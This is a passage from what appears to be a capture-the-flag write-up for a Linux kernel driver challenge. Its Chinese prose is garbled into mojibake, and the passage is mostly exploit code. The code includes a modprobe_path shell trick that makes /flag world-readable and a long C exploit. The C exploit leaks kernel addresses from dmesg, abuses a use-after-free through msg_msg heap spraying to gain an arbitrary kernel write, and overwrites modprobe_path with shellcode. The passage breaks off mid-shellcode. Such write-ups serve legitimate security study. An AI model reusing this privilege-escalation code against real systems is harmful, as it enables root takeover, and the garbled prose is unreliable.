ä¿®æ”¹ç”¨å‚æ•°æ¥crashçš„ç¥å¥‡æ“ä½œ. ä¿®æ”¹kernel_retä¸ºqueryçš„è¿”å›åœ°å€åœ¨æ ˆä¸Šçš„å­˜å‚¨ä½ç½®. </li></ul><p>modprobe:</p><p>é‡ç‚¹åœ¨äºé€ ä¸€ä¸ªå¤´éƒ¨æœªçŸ¥çš„ç¨‹åº. æ‰§è¡Œåå†…æ ¸è‡ªä¼šä½¿ç”¨<code>/tmp/y</code>å¤„ç†, ç„¶è€Œå®ƒåªä¿®æ”¹äº†<code>/flag</code>çš„æƒé™å°±é€€å‡ºäº†. æ­£å¥½ä¹Ÿæ˜¯æˆ‘ä»¬çš„ç›®çš„. </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span>                                           <br>echo -ne &#x27;\xffyyy&#x27; &gt; fake<br>echo -ne &#x27;#!/bin/sh\n/bin/chmod 777 /flag&#x27; &gt; /tmp/y<br>chmod +x fake<br>chmod +x /tmp/y<br>/balsn<br>/balsn<br>/balsn<br>cat /flag<br></code></pre></div></td></tr></table></figure><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// musl-gcc exp.c -o exp -static -masm=intel</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_LINK 0x4008D900</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_GET_INFO 0x8018D901</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_FINALIZE 0xD902</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_QUERY 0xC010D903</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAUSE scanf(<span class="hljs-meta-string">&quot;%*c&quot;</span>);</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> fd1;<br>    <span class="hljs-keyword">int</span> fd2;<br>    <span class="hljs-keyword">size_t</span> distance;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> *<span class="hljs-title">fd</span>, *<span class="hljs-title">bk</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">size_t</span> id;<br>    <span class="hljs-keyword">size_t</span> refcount;<br>    <span class="hljs-keyword">size_t</span> state_lock[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">size_t</span> finalized;<br>    <span class="hljs-keyword">size_t</span> nb_lock[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">size_t</span> num_edges;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> <span class="hljs-title">link_header</span>;</span><br>    <span class="hljs-keyword">size_t</span> index;<br>    <span class="hljs-keyword">size_t</span> tra;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Link_Header</span> <span class="hljs-title">link_header</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">dst_node</span>;</span><br>    <span class="hljs-keyword">size_t</span> weight;<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fd[<span class="hljs-number">100</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">link</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> weight)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// printf(&quot;Creating link between &#x27;%d&#x27; and &#x27;%d&#x27; with weight %u\n&quot;, a, b, weight);</span><br>    assert(ioctl(fd[a], SPARK_LINK, fd[b] | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)weight &lt;&lt; <span class="hljs-number">32</span>)) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span> <span class="hljs-title">qry</span> =</span> &#123;<br>        .fd1 = fd[a],<br>        .fd2 = fd[b],<br>    &#125;;<br>    <span class="hljs-keyword">int</span> ret = ioctl(fd[i], SPARK_QUERY, &amp;qry);<br>    <span class="hljs-comment">// printf( &quot;[query] ret = %d\n&quot; , ret );</span><br>    <span class="hljs-comment">// printf(&quot;The length of shortest path between &#x27;%d&#x27; and &#x27;%d&#x27; is %lld\n&quot;, a, b, qry.distance);</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_info</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">size_t</span> buf[<span class="hljs-number">3</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0xcc</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    assert(ioctl(fd[a], SPARK_GET_INFO, buf) == <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[get info %d] &quot;</span>, a);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; ++i)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p &quot;</span>, buf[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_open</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    fd[i] = open(<span class="hljs-string">&quot;/dev/node&quot;</span>, O_RDWR);<br>    assert(fd[i] &gt;= <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_close</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    close(fd[i]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">spark_finalize</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span></span><br><span class="hljs-function"></span>&#123;<br>    ioctl(fd[i], SPARK_FINALIZE);<br>&#125;<br><br><span class="hljs-comment">// for kmalloc</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MsgBuf</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> mtype;<br>    <span class="hljs-keyword">char</span> mtext[<span class="hljs-number">0x10000</span>]; <span class="hljs-comment">// 65536</span><br>&#125; msgbuf;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msg_open</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> qid;<br>    <span class="hljs-keyword">if</span> ((qid = msgget(IPC_PRIVATE, <span class="hljs-number">0644</span> | IPC_CREAT)) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgget&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> qid;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_send</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">char</span> *data, <span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    msgbuf.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">memcpy</span>(msgbuf.mtext, &amp;data[<span class="hljs-number">0x30</span>], size - <span class="hljs-number">0x30</span>);<br>    <span class="hljs-keyword">if</span> (msgsnd(qid, &amp;msgbuf, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgsnd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">msg_free</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    msgbuf.mtype = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (msgrcv(qid, &amp;msgbuf, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">-1</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;msgsnd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">arb_write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> qid, <span class="hljs-keyword">size_t</span> off)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> <span class="hljs-title">data</span> =</span> &#123;<br>        .index = off,<br>    &#125;;<br><br>    <span class="hljs-comment">// change content</span><br>    msg_free(qid, <span class="hljs-number">0x80</span>);<br>    msg_send(qid, &amp;data, <span class="hljs-number">0x80</span>);<br><br>    query(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>, <span class="hljs-number">22</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">crash</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Crashing...&quot;</span>);<br>    spark_open(<span class="hljs-number">0</span>);<br>    spark_open(<span class="hljs-number">1</span>);<br>    link(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>    spark_close(<span class="hljs-number">1</span>);<br>    spark_finalize(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-keyword">size_t</span> kernel_stack, kernel_heap;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">leak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        crash();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    sleep(<span class="hljs-number">0.5</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] get info from dmesg\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> i, sz;<br>    <span class="hljs-keyword">char</span> *buf;<br>    <span class="hljs-comment">//*query the size of the kernel ring buffer</span><br>    sz = klogctl(<span class="hljs-number">10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    assert(sz != <span class="hljs-number">-1</span>);<br>    buf = <span class="hljs-built_in">malloc</span>(sz);<br>    <span class="hljs-comment">//*read all message from the kernel buffer into @buf.</span><br>    assert(klogctl(<span class="hljs-number">3</span>, buf, sz) != <span class="hljs-number">-1</span>);<br>    <span class="hljs-comment">// size_t kernel_heap, kernel_stack;</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz &amp;&amp; (!kernel_stack || !kernel_heap); i++)<br>    &#123;<br>        <span class="hljs-comment">//*rax stores dis_arr</span><br>        <span class="hljs-keyword">if</span> (!kernel_stack &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RSP: 0018:&quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">10</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;kernel_stack) != <span class="hljs-number">1</span>)<br>                kernel_stack = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//*r9 stores the edge</span><br>        <span class="hljs-keyword">if</span> (!kernel_heap &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RBX: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;kernel_heap) != <span class="hljs-number">1</span>)<br>                kernel_heap = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    assert(kernel_stack &amp;&amp; kernel_heap);<br>    <span class="hljs-built_in">free</span>(buf);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak kernel stack addr: %p\n&quot;</span>, kernel_stack);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Leak kernel heap addr: %p\n&quot;</span>, kernel_heap);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffff98d5cdd2be80:0xffffffffffffffff0x000000000088770f</span><br><span class="hljs-comment">0xffff98d5cdd2be90:0x000000000088770e0x000000000088770d</span><br><span class="hljs-comment">0xffff98d5cdd2bea0:0x000000000088770c0x000000000088770b</span><br><span class="hljs-comment">0xffff98d5cdd2beb0:0x000000000088770a0x0000000000887709</span><br><span class="hljs-comment">0xffff98d5cdd2bec0:0x0093037d5f064f380x0000000000887707</span><br><span class="hljs-comment">0xffff98d5cdd2bed0:0x00000000008877060x0000000000887705</span><br><span class="hljs-comment">0xffff98d5cdd2bee0:0x00000000008877040x0000000000887703</span><br><span class="hljs-comment">0xffff98d5cdd2bef0:0x00000000008877020x0000000000887701</span><br><span class="hljs-comment">0xffff98d5cdd2bf00:0x00000000000000000x0000000000000000</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> target_area_size 0x1000000</span><br><span class="hljs-keyword">size_t</span> cushion[target_area_size];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// size_t kernel_heap = strtoull(argv[1],0,16);    // input RBX by hand</span><br>    leak(); <span class="hljs-comment">// change to better way for leak</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> <span class="hljs-title">node</span> =</span> &#123;<br>        .id = <span class="hljs-number">0xffffffffffff</span>,<br>        .refcount = <span class="hljs-number">0</span>,<br>        .state_lock = &#123;<span class="hljs-number">0</span>&#125;,<br>        .finalized = <span class="hljs-number">1</span>,<br>        .nb_lock = &#123;<span class="hljs-number">0</span>&#125;,<br>        .num_edges = <span class="hljs-number">1</span>,<br>        .link_header.fd = <span class="hljs-number">0x1111</span>,<br>        .link_header.bk = <span class="hljs-number">0x2222</span>,<br>        .index = <span class="hljs-number">0x6666</span>,<br>        .tra = <span class="hljs-number">0</span>,<br>    &#125;;<br><br>    <span class="hljs-keyword">size_t</span> *fake_node = &amp;node;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        spark_open(i);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x10</span>; ++i)<br>        link(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span> - i, fake_node[<span class="hljs-number">0x10</span> - i]);<br><br>    spark_finalize(<span class="hljs-number">0</span>);<br><br>    spark_open(<span class="hljs-number">20</span>);<br>    spark_open(<span class="hljs-number">21</span>);<br>    spark_open(<span class="hljs-number">22</span>);<br>    link(<span class="hljs-number">20</span>, <span class="hljs-number">22</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// link( 20 , 21 , 0x7777777 );      // rip</span><br>    link(<span class="hljs-number">20</span>, <span class="hljs-number">21</span>, shellcode + <span class="hljs-number">4</span>);<br>    spark_close(<span class="hljs-number">21</span>); <span class="hljs-comment">// free node 21</span><br><br>    query(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// overwrite node 21</span><br><br>    spark_finalize(<span class="hljs-number">20</span>);<br><br>    <span class="hljs-comment">// get UAF node 21</span><br>    <span class="hljs-keyword">int</span> qid = msg_open();<br>    msg_send(qid, &amp;fake_node, <span class="hljs-number">0x80</span>);<br><br>    <span class="hljs-keyword">size_t</span> dis_heap_addr = kernel_heap;<br>    dis_heap_addr &amp;= ~(target_area_size - <span class="hljs-number">1</span>);<br>    dis_heap_addr -= target_area_size * <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] init heap address of distanse array: %p\n&quot;</span>, dis_heap_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] cushion addr: %p\n&quot;</span>, cushion);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Searching ...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target_area_size; ++i)<br>        cushion[i] = <span class="hljs-number">0x7ffffffffffffff</span>;<br><br>    <span class="hljs-comment">// write to userland</span><br>    <span class="hljs-keyword">size_t</span> addr = ((<span class="hljs-keyword">size_t</span>)cushion - dis_heap_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[+] travsersal addr: %p\n&quot;</span>, addr);<br>    arb_write(qid, addr / <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">// find offset</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; target_area_size; ++i)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (cushion[i] != <span class="hljs-number">0x7ffffffffffffff</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Found at idx:%p content:%p addr:%p\n&quot;</span>, i, cushion[i], &amp;cushion[i]);<br>            dis_heap_addr += i * <span class="hljs-number">8</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] dis_heap_addr: %p\n&quot;</span>, dis_heap_addr);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// overwrite the ret address to shellcode().</span><br>    <span class="hljs-keyword">size_t</span> kernel_ret_addr = kernel_stack + <span class="hljs-number">0xa0</span>;<br>    arb_write(qid, (kernel_ret_addr - dis_heap_addr) / <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">shellcode</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov rdi, [rsp+0x10];&quot;</span><br>        <span class="hljs-string">&quot;add rdi, 0x11b2097;&quot;</span><br>        <span class="hljs-string">&quot;mov rsi, 0x792f706d742f;&quot;</span> <span class="hljs-comment">// &quot;/tmp/y&quot;</span><br>        <span class="hljs-string">&quot;mov [rdi], rsi;&quot;</span>          <span class="hljs-comment">// modprobe_path</span><br>        <span 